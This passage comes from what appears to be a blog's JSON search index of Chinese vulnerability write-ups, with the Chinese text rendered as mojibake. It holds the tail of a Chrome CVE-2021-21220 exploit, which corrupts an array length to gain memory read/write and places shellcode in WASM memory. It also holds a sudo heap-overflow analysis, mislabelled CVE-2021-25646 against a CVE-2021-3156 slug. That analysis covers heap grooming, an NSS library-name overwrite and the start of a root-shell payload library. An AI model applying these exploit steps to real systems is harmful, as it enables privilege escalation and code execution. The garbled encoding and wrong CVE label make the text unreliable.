5.1;//4014666666666666 let buff = new LeakArrayBuffer(0x1000);// arr[0] = 0x1122;//ä¿®æ”¹æ•°ç»„é•¿åº¦ return [arr, local_arr, buff]; &#125; for (var i = 0; i &lt; 0x10000; ++i) foo(false); gc(); gc(); [corrput_arr, rwarr, corrupt_buff] = foo(true); é€šè¿‡ä»£ç Array(Math.sign(0 â€“ Math.max(0, x, -1)))åˆ›å»ºä¸€ä¸ªlengthä¸º-1çš„æ•°ç»„ï¼Œç„¶åä½¿ç”¨LeakArrayBufferæ„é€ å†…å­˜å¸ƒå±€ï¼Œå°†ç›¸å¯¹è¯»å†™å¸ƒå±€æˆç»å¯¹è¯»å†™ã€‚ è¿™é‡Œéœ€è¦è¯´æ˜çš„æ˜¯ï¼Œç”±äºchrome80ä»¥ä¸Šç‰ˆæœ¬å¯ç”¨äº†åœ°å€å‹ç¼©ï¼Œåœ°å€é«˜4ä¸ªå­—èŠ‚ï¼Œå¯ä»¥åœ¨æ„é€ çš„arrayåé¢çš„å›ºå®šåç§»æ‰¾åˆ°ã€‚ å…ˆå°†corrupt_bufferçš„åœ°å€æ³„éœ²ï¼Œç„¶åå¦‚ä¸‹è®¡ç®—åœ°å€ (corrupt_buffer_ptr_low &amp; 0xffff0000) - ((corrupt_buffer_ptr_low &amp; 0xffff0000) % 0x40000) + 0x40000; å¯ä»¥è®¡ç®—å‡ºé«˜4å­—èŠ‚ã€‚ åŒæ—¶ç»“åˆ0x02æ­¥éª¤ä¸­å®ç°çš„ç›¸å¯¹è¯»å†™å’Œå¯¹è±¡æ³„éœ²ï¼Œå¯å®ç°ç»å¯¹åœ°å€è¯»å†™ã€‚@r4j0x00åœ¨issue 1196683ä¸­æ„é€ lengthä¸º-1æ•°ç»„åï¼Œåˆ™é€šè¿‡ä¼ªé€ å¯¹è±¡å®ç°ä»»æ„åœ°å€è¯»å†™ã€‚ ä¹‹åï¼Œç”±äºWASMå†…å­˜å…·æœ‰RWXæƒé™ï¼Œå› æ­¤å¯ä»¥å°†shellcodeæ‹·è´åˆ°WASMæ‰€åœ¨å†…å­˜ï¼Œå®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚","categories":[{"name":"CVE","slug":"CVE","permalink":"http://example.com/categories/CVE/"}],"tags":[{"name":"å †æº¢å‡º","slug":"å †æº¢å‡º","permalink":"http://example.com/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/"},{"name":"CVE-2021-21220","slug":"CVE-2021-21220","permalink":"http://example.com/tags/CVE-2021-21220/"}]},{"title":"CVE-2021-25646å †æº¢å‡ºæ¼æ´å¤ç°åŠåˆ†æ","slug":"CVE-2021-3156","date":"2021-04-08T17:24:39.000Z","updated":"2022-03-25T13:51:42.000Z","comments":true,"path":"2021/04/09/CVE-2021-3156/","link":"","permalink":"http://example.com/2021/04/09/CVE-2021-3156/","excerpt":"","text":"CVE-2021-25646å †æº¢å‡ºæ¼æ´å¤ç°åŠåˆ†ææ¼æ´è¯¦æƒ…â€‹ å½“åœ¨ç±»Unixçš„æ“ä½œç³»ç»Ÿä¸Šæ‰§è¡Œå‘½ä»¤æ—¶ï¼Œérootç”¨æˆ·å¯ä»¥ä½¿ç”¨sudoå‘½ä»¤æ¥ä»¥rootç”¨æˆ·èº«ä»½æ‰§è¡Œå‘½ä»¤ã€‚ç”±äºsudoé”™è¯¯åœ°åœ¨å‚æ•°ä¸­è½¬ä¹‰äº†åæ–œæ å¯¼è‡´å †ç¼“å†²åŒºæº¢å‡ºï¼Œä»è€Œå…è®¸ä»»ä½•æœ¬åœ°ç”¨æˆ·ï¼ˆæ— è®ºæ˜¯å¦åœ¨sudoersæ–‡ä»¶ä¸­ï¼‰è·å¾—rootæƒé™ï¼Œæ— éœ€è¿›è¡Œèº«ä»½éªŒè¯ï¼Œä¸”æ”»å‡»è€…ä¸éœ€è¦çŸ¥é“ç”¨æˆ·å¯†ç ã€‚ â€‹ å½±å“èŒƒå›´ï¼š â€‹ Sudo 1.8.2 - 1.8.31p2 â€‹ Sudo 1.9.0 - 1.9.5p1 æ¼æ´åŸç†åˆ†æâ€‹ å¯¹äºbashè€Œè¨€å‡å¦‚æˆ‘ä»¬å¸Œæœ›æ‰§è¡ŒæŸä¸ªå‘½ä»¤å¯ä»¥ä½¿ç”¨bash -c [command]æ¥æ‰§è¡Œï¼Œå¦‚æœæˆ‘ä»¬å¸Œæœ›ä»¥rootçš„æƒé™å»æ‰§è¡ŒæŸä¸ªå‘½ä»¤çš„è¯å¯ä»¥ç›´æ¥sudo [cmd]ï¼Œè€Œå¦‚æœæˆ‘ä»¬å¸Œæœ›ä»¥shellæ¨¡å¼å»æ‰§è¡ŒæŸä¸ªå‘½ä»¤çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨sudo -iæˆ–è€…sudo -så‚æ•°ï¼Œåœ¨å‚æ•°è¯´æ˜é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°-i, --login run login shell as the target user; a command may also be specifiedï¼Œ -s, --shell run shell as the target user; a command may also be specifiedï¼Œå½“æˆ‘ä»¬ä½¿ç”¨ä¸Šè¿°å‚æ•°æ—¶å¯¹äºsudoçš„flagsè€Œè¨€æœ‰ä¸¤ç§æƒ…å†µï¼š ä½¿ç”¨sudo -sï¼Œè®¾ç½®MO DE_SHELL ä½¿ç”¨sudo -iï¼Œè®¾ç½®MODE_SHELL|MODE_LOGIN_SHELL â€‹ åœ¨src/parse_args.cé‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¯¹äºè¿™ç§æ¨¡å¼çš„å‚æ•°å¤„ç†ï¼Œå¤„ç†æ–¹å¼ä¸ºå°†å‚æ•°æŒ‰ç…§ç©ºæ ¼æ‹¼æ¥èµ·æ¥ï¼Œå¯¹äºä¸€äº›å…ƒå­—ç¬¦ä½¿ç”¨åæ–œçº¿è¿›è¡Œè½¬ä¹‰å¤„ç†ï¼Œæœ€ç»ˆè¦†å†™äº†argvä¸ºacè¿™ä¸ªæŒ‡é’ˆæ•°ç»„ã€‚ â€‹ æºç åˆ†æï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455/* * For shell mode we need to rewrite argv */ if (ISSET(mode, MODE_RUN) &amp;&amp; ISSET(flags, MODE_SHELL)) &#123; char **av, *cmnd = NULL; int ac = 1; if (argc != 0) &#123; /* shell -c &quot;command&quot; */ char *src, *dst; //å¾—åˆ°å‘½ä»¤çš„é•¿åº¦ size_t cmnd_size = (size_t) (argv[argc - 1] - argv[0]) + strlen(argv[argc - 1]) + 1; cmnd = dst = reallocarray(NULL, cmnd_size, 2); if (cmnd == NULL) sudo_fatalx(U_(&quot;%s: %s&quot;), __func__, U_(&quot;unable to allocate memory&quot;)); if (!gc_add(GC_PTR, cmnd)) exit(1); //æ‹¼æ¥å‘½ä»¤å¹¶ä¸”å¤„ç†è½¬ç§»ç¬¦ for (av = argv; *av != NULL; av++) &#123; for (src = *av; *src != &#x27;\\0&#x27;; src++) &#123; /* quote potential meta characters */ if (!isalnum((unsigned char)*src) &amp;&amp; *src != &#x27;_&#x27; &amp;&amp; *src != &#x27;-&#x27; &amp;&amp; *src != &#x27;$&#x27;) *dst++ = &#x27;\\\\&#x27;;//å¤„ç†è½¬ä¹‰å­—ç¬¦ï¼Œ&#x27;\\\\&#x27;è¡¨ç¤ºåæ–œçº¿ *dst++ = *src; &#125; *dst++ = &#x27; &#x27;; &#125; if (cmnd != dst) dst--; /* replace last space with a NUL */ *dst = &#x27;\\0&#x27;; ac += 2; /* -c cmnd */ &#125; //ä¸Šè¿°å¤„ç†å®Œæ¯•åç»“æœä¿å­˜åœ¨dstæŒ‡é’ˆæŒ‡å‘çš„å†…å­˜ av = reallocarray(NULL, ac + 1, sizeof(char *)); //åˆ†é…æ–°çš„å†…å­˜ä¿å­˜æ‹¼æ¥çš„å‘½ä»¤ if (av == NULL) sudo_fatalx(U_(&quot;%s: %s&quot;), __func__, U_(&quot;unable to allocate memory&quot;)); if (!gc_add(GC_PTR, av)) exit(1); av[0] = (char *)user_details.shell; /* plugin may override shell */ if (cmnd != NULL) &#123; av[1] = &quot;-c&quot;; av[2] = cmnd; &#125; av[ac] = NULL; //æœ€åçš„å½¢å¼ä¸º shell -c cmnd(shellå’Œç¯å¢ƒå˜é‡ç›¸å…³ï¼Œæ¯”å¦‚æˆ‘è¿™é‡Œæ˜¯zshï¼Œshellä¸º/usr/bin/zsh) //æœ€ç»ˆç”¨avè¦†å†™argv argv = av; argc = ac; &#125; â€‹ éšååœ¨sudoers.cä¸­çš„sudoers_policy_mainå‡½æ•°ä¸­è°ƒç”¨set_cmndå°†å‘½ä»¤è¡Œå‚æ•°å­˜æ”¾åœ¨ä¸€ä¸ªå †ä¸Šçš„æ•°æ®ç»“æ„user_argsä¸­ï¼Œè¿™é‡Œä¹Ÿå¯¹å…ƒå­—ç¬¦åšäº†å¤„ç†ï¼Œå‡å¦‚ä¸æ˜¯\\\\+spaceçš„å½¢å¼å°±è·³è¿‡å…ƒå­—ç¬¦ï¼Œå¦åˆ™æ‹·è´åˆ°*toã€‚é‚£ä¹ˆå‡å¦‚æˆ‘ä»¬çš„å‘½ä»¤è¡Œå‚æ•°ä»¥\\\\ç»“å°¾ï¼Œé‚£ä¹ˆfrom[0]=&#39;\\\\&#39;;from[1]=NULL(æ³¨æ„NULLå¹¶ésapceèŒƒå›´)ï¼Œæ­¤æ—¶from++æŒ‡å‘ç©ºå­—ç¬¦ï¼Œä¸‹é¢å°†ç©ºå­—ç¬¦æ‹·è´åˆ°äº†*toå¹¶ä¸”from++åæ‰§è¡Œäº†NULLåé¢çš„å­—ç¬¦ï¼Œæ­¤æ—¶å†æ¬¡è¿›è¡Œwhileå¾ªç¯åˆ¤æ–­æ—¶å¾ˆæ˜æ˜¾è¿™é‡Œæ˜¯å¯ä»¥ç»§ç»­è¿›å…¥å¾ªç¯çš„(å¦‚æœåä¸€ä¸ªå­—ç¬¦ä¸ä¸ºNULL)ï¼Œä»è€Œèµ‹å€¼å¾—ä»¥ç»§ç»­è¿›è¡Œï¼Œä»è€Œäº§ç”Ÿäº†æº¢å‡ºã€‚ 1234567891011121314151617if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123; /* * When running a command via a shell, the sudo front-end * escapes potential meta chars. We unescape non-spaces * for sudoers matching and logging purposes. */ for (to = user_args, av = NewArgv + 1; (from = *av); av++) &#123; while (*from) &#123; if (from[0] == &#x27;\\\\&#x27; &amp;&amp; !isspace((unsigned char)from[1])) from++; *to++ = *from++; &#125; *to++ = &#x27; &#x27;; &#125; *--to = &#x27;\\0&#x27;; &#125; set_cmnd()å­˜åœ¨è¶Šç•Œå†™ï¼Œæº¢å‡ºuser_argså †ç¼“å†²åŒºï¼ˆsizeæ˜¯åœ¨852-853è¡Œä¸­è®¡ç®—ï¼‰ã€‚æ ¹æœ¬åŸå› å°±æ˜¯ï¼Œsudoé»˜è®¤ \\ åé¢è‚¯å®šè·Ÿç€å…ƒå­—ç¬¦ï¼Œå®é™…ä¸Šåé¢åªæœ‰1ä¸ªç»“æŸç¬¦ã€‚ å½“fromæŒ‡å‘\\æ—¶ï¼Œfrom[1]æŒ‡å‘NULLå­—èŠ‚ï¼Œfrom[2]æŒ‡å‘çš„å°±æ˜¯ç¯å¢ƒå˜é‡çš„ç¬¬ä¸€ä¸ªå­—èŠ‚äº†ï¼Œæ‰§è¡Œ*too=*from++ï¼Œå¯ä»¥å°†åé¢çš„NULLå­—èŠ‚æ‹·è´åˆ°user_argsçš„å †ä¸­ï¼Œä¸”è®©from++ï¼Œä»è€Œé¿å¼€äº†while(*fromï¼‰åˆ¤æ–­æ˜¯å¦è¯»åˆ°NULLå­—èŠ‚çš„æ£€æµ‹ï¼Œç”±äºå‚æ•°åé¢ç´§è·Ÿç¯å¢ƒå˜é‡çš„å€¼ï¼Œå› æ­¤é€šè¿‡è®¾ç½®ç¯å¢ƒå˜é‡çš„å€¼æ¥è¦†ç›–user_argså †åé¢çš„æ•°æ®ã€‚ â€‹ ä¸Šè¿°æ˜¯æˆ‘ä»¬çš„ç†è®ºåˆ†æï¼Œåœ¨ç†è®ºè§’åº¦ä¸Šçœ‹æ¼æ´æ˜¯å­˜åœ¨çš„ï¼Œä½†æ˜¯æˆ‘ä»¬åœ¨ä¹‹å‰çš„æ¼æ´ä¸­ä¹Ÿè§åˆ°è¿‡ç”±äºæ— æ³•åˆ›é€ æ¼æ´åˆ©ç”¨åœºæ™¯(æ¯”å¦‚æˆ‘æƒ³ææƒä½†æ˜¯expé‡Œéœ€è¦æŸä¸ªrootç”¨æˆ·ç»™çš„capability)ï¼Œè¿™æ ·çš„æ´å°±éå¸¸é¸¡è‚‹ã€‚é‚£ä¹ˆåœ¨æˆ‘ä»¬çš„åˆ†æé‡Œæœ‰å‡ ä¸ªç†æƒ³æ¡ä»¶ï¼Œé‚£ä¹ˆæœ€åçš„è¿™ä¸ªåœºæ™¯ï¼Œå³åæ–œçº¿ä½œä¸ºcmd-lineçš„æœ€åä¸€ä¸ªå­—ç¬¦ä»ç†è®ºä¸Šæ¥è¯´æ˜¯æ— æ³•å®ç°çš„ï¼Œè¿™é‡Œè¦æ±‚æˆ‘ä»¬æœ‰MODE_SHELL|MODE_LOGIN_SHELLï¼Œè€Œå‡å¦‚flagåŒ…å«MODE_SHELLçš„è¯åœ¨æˆ‘ä»¬ä¹‹å‰çš„parse_argså‚æ•°è§£æä¸­å°±ä¼šå°†æ‰€æœ‰å…ƒå­—ç¬¦ç»™è½¬ä¹‰æ‰ï¼Œä¹Ÿå°±æ˜¯è¯´ä¼šæœ‰ä¸¤ä¸ªåæ–œçº¿ï¼Œæˆ‘ä»¬å†æŒ‰ç…§ä»£ç èµ°ä¸€éä¼šå‘ç°è¿™æ ·å¾ªç¯æœ«å°¾çš„*from=NULLï¼Œå› æ­¤ä¼šè·³å‡ºå¾ªç¯ã€‚ â€‹ å†ä»”ç»†å¯¹æ¯”ä¸€ä¸‹äºŒè€…çš„æ¡ä»¶ï¼ŒäºŒè€…çš„æ¡ä»¶ç•¥æœ‰ä¸åŒã€‚æˆ‘ä»¬çš„é—®é¢˜åœ¨äºèƒ½å¦è®¾ç½®flagä¸ºMODE_SHELLä»¥åŠMODE_RUNæˆ–è€…MODE_EDITæˆ–è€…MODE_CHECKã€‚ â€‹ å†çœ‹ä¸‹è§£æå‚æ•°çš„éƒ¨åˆ†ä¼šå‘ç°å¥½åƒè¿˜æ˜¯ä¸å¤ªè¡Œï¼Œå‡å¦‚æˆ‘ä»¬ä½¿ç”¨-eå‚æ•°è®¾ç½®MODE_EDITæˆ–è€…ä½¿ç”¨-lå‚æ•°è®¾ç½®MODE_CHECKï¼Œæˆ‘ä»¬çš„MODE_SHELLå‚æ•°å°±ä¼šè¢«ä»valid_flagså»æ‰ã€‚ 12345678910//bug conditionif (sudo_mode &amp; (MODE_RUN | MODE_EDIT | MODE_CHECK)) &#123; //... if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123; &#125;&#125;//escape meta char conditionif (ISSET(mode, MODE_RUN) &amp;&amp; ISSET(flags, MODE_SHELL)) &#123; //.. &#125; 1234567891011121314151617181920212223242526#define MODE_NONINTERACTIVE 0x00800000#define MODE_SHELL 0x00020000//parse_args.ccase &#x27;e&#x27;: if (mode &amp;&amp; mode != MODE_EDIT) usage_excl(1); mode = MODE_EDIT; sudo_settings[ARG_SUDOEDIT].value = &quot;true&quot;; valid_flags = MODE_NONINTERACTIVE;//è¿™é‡Œ break; //...case &#x27;l&#x27;: if (mode) &#123; if (mode == MODE_LIST) SET(flags, MODE_LONG_LIST); else usage_excl(1); &#125; mode = MODE_LIST; valid_flags = MODE_NONINTERACTIVE|MODE_LONG_LIST;//è¿™é‡Œ //...if ((flags &amp; valid_flags) != flags) usage(1); â€‹ æœ€åä½œè€…å‘ç°äº†ä¸€ä¸ªå¯ä»¥åˆ©ç”¨çš„åœ°æ–¹(ç›²çŒœæ˜¯é€šè¿‡å…¨å±€æœflagæ‰¾åˆ°çš„)ï¼Œé‚£å°±æ˜¯å¦‚æœæˆ‘ä»¬å»æ‰§è¡Œsudoeditï¼Œparse_argså‡½æ•°ä¼šè‡ªåŠ¨è®¾ç½®MODE_EDITï¼Œå¹¶ä¸”ä¸ä¼šé‡ç½®valid_flagsï¼Œè€Œvalid_flagsé»˜è®¤åŒ…å«äº†MODE_SHELLã€‚ 123456789101112131415/* * Default flags allowed when running a command. */#define DEFAULT_VALID_FLAGS (MODE_BACKGROUND|MODE_PRESERVE_ENV|MODE_RESET_HOME|MODE_LOGIN_SHELL|MODE_NONINTERACTIVE|MODE_SHELL)int valid_flags = DEFAULT_VALID_FLAGS; /* First, check to see if we were invoked as &quot;sudoedit&quot;. */ proglen = strlen(progname); if (proglen &gt; 4 &amp;&amp; strcmp(progname + proglen - 4, &quot;edit&quot;) == 0) &#123; progname = &quot;sudoedit&quot;; mode = MODE_EDIT; sudo_settings[ARG_SUDOEDIT].value = &quot;true&quot;; &#125; â€‹ ä¹Ÿå°±æ˜¯è¯´ï¼ŒåŠ å…¥æˆ‘ä»¬æ‰§è¡Œsudoedit -sï¼Œå°±åŒæ—¶å…¼å…·äº†MODE_SHELL|MODE_EDITè€Œæ²¡æœ‰MODE_RUNï¼Œå› æ­¤å¯ä»¥æˆåŠŸåˆ°è¾¾æ¼æ´ç‚¹ã€‚ ä¸€ä¸ªæº¢å‡ºdemoï¼š 1.å †æº¢å‡ºåˆ†æ1.å †åœ¨å†…å­˜ä¸­çš„ä½ç½® 2.å †çš„ç»“æ„ arenaï¼šé€šè¿‡sbrkæˆ–mmapç³»ç»Ÿè°ƒç”¨ä¸ºçº¿ç¨‹åˆ†é…çš„å †åŒºï¼ŒæŒ‰çº¿ç¨‹çš„ç±»å‹å¯ä»¥åˆ†ä¸º2ç±»ï¼š main arenaï¼šä¸»çº¿ç¨‹å»ºç«‹çš„arenaï¼› thread arenaï¼šå­çº¿ç¨‹å»ºç«‹çš„arenaï¼› binï¼šä¸€ä¸ªç”¨ä»¥ä¿å­˜Free chunké“¾è¡¨çš„è¡¨å¤´ä¿¡æ¯çš„æŒ‡é’ˆæ•°ç»„ï¼ŒæŒ‰æ‰€æ‚¬æŒ‚é“¾è¡¨çš„ç±»å‹å¯ä»¥åˆ†ä¸º4ç±»: Fast binï¼šFast bin å…±æœ‰10ä¸ªï¼Œå­˜å‚¨äº†chunk size ä»16åˆ°80çš„free chunkï¼Œè¿™äº›free chunkè¢«ç§°ä½œfast chunk Unsorted binï¼šå½“é‡Šæ”¾è¾ƒå°æˆ–è¾ƒå¤§çš„chunkçš„æ—¶å€™ï¼Œå¦‚æœç³»ç»Ÿæ²¡æœ‰å°†å®ƒä»¬æ·»åŠ åˆ°å¯¹åº”çš„binsä¸­ï¼Œç³»ç»Ÿå°±å°†è¿™äº›chunkæ·»åŠ åˆ°unsorted binä¸­ã€‚ Small binï¼šå°äº512å­—èŠ‚çš„chunkç§°ä¹‹ä¸ºsmall chunkï¼Œsmall binå°±æ˜¯ç”¨äºç®¡ç†small chunkçš„ã€‚ Large binï¼šå¤§äº512å­—èŠ‚çš„chunkç§°ä¹‹ä¸ºlarge chunkï¼Œlarge binå°±æ˜¯ç”¨äºç®¡ç†è¿™äº›large chunkçš„ã€‚ PS:libc2.26 ä¹‹åçš„ Tcache æœºåˆ¶ Tcache bin :ç±»ä¼¼äºfastbinä¸€æ ·çš„ä¸œè¥¿ï¼Œæ¯æ¡é“¾ä¸Šæœ€å¤šå¯ä»¥æœ‰ 7 ä¸ª chunkï¼Œfreeçš„æ—¶å€™å½“tcacheæ»¡äº†æ‰æ”¾å…¥fastbinï¼Œunsorted binï¼Œmallocçš„æ—¶å€™ä¼˜å…ˆå»tcacheæ‰¾ã€‚ åŒºåˆ«ï¼šMax fast bins size is 0x80. Max tcache bins size is 0x410 mutexï¼šäº’æ–¥é”ï¼Œé˜²æ­¢å¤šçº¿ç¨‹å¯¹chunkèµ„æºçš„ç«äº‰ Large binï¼š chunkï¼šé€»è¾‘ä¸Šåˆ’åˆ†çš„ä¸€å°å—å†…å­˜ï¼Œæ ¹æ®ä½œç”¨ä¸åŒåˆ†ä¸º4ç±»ï¼š Allocated chunkï¼šå³åˆ†é…ç»™ç”¨æˆ·ä¸”æœªé‡Šæ”¾çš„å†…å­˜å—ï¼› Free chunkï¼šå³ç”¨æˆ·å·²ç»é‡Šæ”¾çš„å†…å­˜å—ï¼› Top chunkï¼šå¤„äºä¸€ä¸ªarenaçš„æœ€é¡¶éƒ¨çš„chunk Last Remainder chunkï¼šå¯¹small binçš„mallocæœºåˆ¶çš„ä»‹ç»ä¸­å½“ç”¨æˆ·è¯·æ±‚çš„æ˜¯ä¸€ä¸ªsmall chunkï¼Œä¸”è¯¥è¯·æ±‚æ— æ³•è¢«small binã€unsorted binæ»¡è¶³çš„æ—¶å€™ï¼Œå°±é€šè¿‡binmapséå†binæŸ¥æ‰¾æœ€åˆé€‚çš„chunkï¼Œå¦‚æœè¯¥chunkæœ‰å‰©ä½™éƒ¨åˆ†çš„è¯ï¼Œå°±å°†è¯¥å‰©ä½™éƒ¨åˆ†å˜æˆä¸€ä¸ªæ–°çš„chunkåŠ å…¥åˆ°unsorted binä¸­ï¼Œå¦å¤–ï¼Œå†å°†è¯¥æ–°çš„chunkå˜æˆæ–°çš„last remainder chunkã€‚ æ ‡å¿—ä½ï¼š A:è®°å½•å½“å‰chunkæ˜¯å¦å±äºä¸»çº¿ç¨‹ M:è®°å½•å½“å‰chunkæ˜¯å¦æ˜¯ç”±mmapåˆ†é… P:è®°å½•å‰ä¸€ä¸ªchunkå—æ˜¯å¦è¢«åˆ†é… Malloc Algorithmï¼š 1.è‹¥mallocè¯·æ±‚å¤§å°ä¸tcacheä¸­æŸä¸ªchunkå¤§å°å®Œå…¨åŒ¹é…ï¼Œä¼˜å…ˆä»tcache binsè°ƒç”¨è€Œä¸å¿…å‘large binå‘å‡ºè¯·æ±‚ã€‚ 2.è‹¥è¯·æ±‚å†…å­˜è¶³å¤Ÿå¤§ï¼Œåˆ™è°ƒç”¨mmap()ç›´æ¥å‘æ“ä½œç³»ç»Ÿä»å†…å­˜ä¸­è°ƒç”¨ 3.è‹¥fast binä¸­æœ‰åˆé€‚å¤§å°çš„å—ï¼Œåˆ™å…ˆä»ä¸­åˆ†é… TO be continuedâ€¦. Free Algorithmï¼š 1.è‹¥tcache binsæœ‰ç©ºé—´ï¼Œåˆ™ä¼˜å…ˆå°†ç©ºé—²å—æ”¾å…¥å…¶ä¸­ 2.å¦‚æœå—è¶³å¤Ÿå°ï¼Œåˆ™ä¼˜å…ˆæ”¾å…¥fast binsä¸­ TO be continuedâ€¦. ä»è¯¥è°ƒåº¦ç®—æ³•å¯ä»¥çœ‹å‡ºï¼ŒæŸä¸ªå…·ä½“å¤§å°çš„chunkå¯ä»¥åœ¨tcache bins ä¸­ç¨³å®šå­˜åœ¨ä¸€å®šæ—¶é—´å¹¶ä¸”ä¸å‘ç”Ÿåˆå¹¶ï¼Œè¿™ä¸ªæœºåˆ¶å¯ä»¥ä¸ºæˆ‘ä»¬ç²¾å‡†æº¢å‡ºåˆ°æŸä¸ªç»“æ„ä½“å‰é¢é™„è¿‘æå‰è¿›è¡Œå ä½ã€‚ æ¼æ´åˆ©ç”¨æ€è·¯ï¼šåˆ©ç”¨æº¢å‡ºè¦†å†™nss_libraryä¸ºX/Xï¼Œä»è€ŒåŠ è½½è‡ªå®šä¹‰çš„åº“å‡½æ•°ï¼Œè¿›è€Œget root shellã€‚ çŸ¥è¯†èƒŒæ™¯ï¼š 1.glibc setlocalemain()å‡½æ•°è¾ƒæ—©è°ƒç”¨äº†setlocale()å‡½æ•°ï¼ŒæŸ¥é˜…æºç æˆ‘ä»¬å‘ç°æ­¤å¤„è¿›è¡Œäº†mallocæ“ä½œï¼Œè¿™æ ·å¯ä»¥åˆ†é…å¹¶é‡Šæ”¾å‡ ä¸ªLCç¯å¢ƒå˜é‡ï¼ˆLC_CTYPEï¼ŒLC_MESSAGESï¼ŒLC_TIMEç­‰ï¼‰ï¼Œè¿™æ ·å°±åœ¨Sudoçš„å †å¼€å¤´å¤„ç•™ä¸‹äº†ç©ºé—²çš„fast/tcache chunks 12345678// /src/sudo.c150: int main(int argc, char *argv[], char *envp[])151: &#123; ...171: setlocale(LC_ALL, &quot;&quot;); ...216: sudo_mode = parse_args(argc, argv, &amp;submit_optind, &amp;nargc, &amp;nargv, &amp;settings, &amp;env_add); æ€»ä¹‹æˆ‘ä»¬å¯ä»¥é€šè¿‡è®¾ç½®ç¯å¢ƒå˜é‡å¯¹å †è¿›è¡Œä¿®é¥°ï¼Œå¾—åˆ°æŒ‡å®šå¤§å°çš„ç©ºé—²chunk å¹¶ä¸”è¯¥å—åœ¨NSSç»“æ„ä½“ä¹‹å‰ã€‚ç”±mallocæœºåˆ¶ä¸éš¾åˆ†æå‡ºï¼Œæˆ‘ä»¬æ§åˆ¶å¥½æº¢å‡ºå¤§å°å¾ˆå®¹æ˜“åœ¨tcacheæˆ–è€…fast binsä¸­å æœ‰è¯¥ç©ºé—²å—ã€‚ 2.NSSï¼ˆName Service Switchï¼‰â€‹ æ¯ä¸ªLinux/Unixçš„æ“ä½œç³»ç»Ÿä¸­éƒ½æœ‰è¿™æ ·çš„ä¸€å¥—ç§°ä¹‹ä¸ºNSSçš„å…±äº«åº“æ¥åšä¸€äº›è§£æï¼Œæ¯”å¦‚ç™»å½•ç”¨æˆ·çš„ç”¨æˆ·åä»¥åŠIPåœ°å€åˆ°åŸŸåçš„è§£æã€‚æ¯”å¦‚å¯¹äºDNSæœåŠ¡æ¥è¯´ï¼Œå®ƒé»˜è®¤æŸ¥çœ‹/etc/resolv.confé…ç½®æ–‡ä»¶çš„å†…å®¹è¿›è¡Œè§£æï¼Œå¯¹äºç”¨æˆ·å’Œç»„æ¥è¯´ï¼Œå®ƒä¼šé»˜è®¤æŸ¥çœ‹/etc/passwdå’Œ/etc/groupã€‚å…¶é…ç½®æ–‡ä»¶ä½äº/etc/nsswitch.confï¼Œå…¶æ¯è¡Œéƒ½è§„å®šäº†æŸ¥æ‰¾æ–¹æ³•çš„è§„èŒƒï¼Œåœ¨GNU C Libraryé‡Œ, æ¯ä¸ªå¯ç”¨çš„SERVICEéƒ½å¿…é¡»æœ‰æ–‡ä»¶ /lib/libnss_SERVICE.so.1 ä¸ä¹‹å¯¹åº”ã€‚**ä¹Ÿå°±æ˜¯è¯´ï¼ŒGNUå°†æ¯ä¸ªæœåŠ¡å®ç°ä¸ºä¸åŒçš„module(shared library)ï¼Œå› æ­¤å¯ä»¥åœ¨Linuxç³»ç»Ÿä¸­æ‰¾åˆ°ä¸‹åˆ—ç›¸åº”çš„å…±äº«åº“ã€‚** 12345678910111213141516171819202122232425262728293031323334353637383940414243444546// 1. service_user ç»“æ„typedef struct service_user&#123;/* And the link to the next entry. */struct service_user *next;/* Action according to result. */lookup_actions actions[5];/* Link to the underlying library object. */service_library *library;/* Collection of known functions. */void *known;/* Name of the service (`files&#x27;, `dns&#x27;, `nis&#x27;, ...). */char name[0];&#125; service_user;// 2. nss_load_library() å‡½æ•°static int nss_load_library (service_user *ni)&#123;if (ni-&gt;library == NULL) &#123; static name_database default_table; ni-&gt;library = nss_new_service (service_table ?: &amp;default_table, // ï¼ˆ1ï¼‰è®¾ç½® ni-&gt;library ni-&gt;name); if (ni-&gt;library == NULL) return -1; &#125;if (ni-&gt;library-&gt;lib_handle == NULL) &#123; /* Load the shared library. */ size_t shlen = (7 + strlen (ni-&gt;name) + 3 + strlen (__nss_shlib_revision) + 1); int saved_errno = errno; char shlib_name[shlen]; /* Construct shared object name. */ __stpcpy (__stpcpy (__stpcpy (__stpcpy (shlib_name, // ï¼ˆ2ï¼‰ä¼ªé€ çš„åº“æ–‡ä»¶åå¿…é¡»æ˜¯ libnss_xxx.so &quot;libnss_&quot;), ni-&gt;name), &quot;.so&quot;), __nss_shlib_revision); ni-&gt;library-&gt;lib_handle = __libc_dlopen (shlib_name); // ï¼ˆ3ï¼‰åŠ è½½ç›®æ ‡åº“ //continue long long function åˆ†æä»£ç å¯çŸ¥ï¼šå¦‚æœæº¢å‡ºåå¯ä»¥è¦†ç›–service_userç»“æ„ã€‚è¯¥ç»“æ„å‡ºç°åœ¨libcçš„nss_load_library()å‡½æ•°ä¸­ï¼Œç”¨äºåŠ è½½åŠ¨æ€é“¾æ¥åº“ã€‚å¦‚æœèƒ½è¦†ç›–service_user-&gt;nameï¼Œå°±èƒ½æŒ‡å®šåŠ è½½æˆ‘ä»¬ä¼ªé€ çš„åº“ï¼Œåˆ©ç”¨rootæƒé™è¿è¡Œérootæƒé™çš„åº“ã€‚ æˆ‘ä»¬è¦åšçš„å°±æ˜¯åˆ©ç”¨æº¢å‡ºéƒ¨åˆ†å°†ni-&gt;library == nullï¼Œæ‰€ä»¥æ‰¾åˆ°è·ç¦»æˆ‘ä»¬å ä½å—æœ€è¿‘çš„ä¸€ä¸ªservice_userç»“æ„ä½“å³å¯ã€‚ gdbè°ƒè¯•æŠ€å·§ï¼š search -s systemd å’Œ search -s mymachine å®šä½å‡ºç°çš„ç»“æ„ä½“ï¼Œæ‰¾åˆ°ä½ç½®æœ€åˆé€‚çš„ä¸€ä¸ªã€‚ Demo: æœ€åä¸€æ­¥ï¼šä¼ªé€ libnss_X/X.so.2åº“ Demo: 12345678910111213141516#include &lt;stdlib.h&gt;#include &lt;stddef.h&gt;#include &lt;unistd.h&gt;static int __attribute__((constructor)) ___init(void)&#123; char *argv[2] = &#123;&quot;sh&quot;, NULL&#125;; setuid(0); setgid(0); 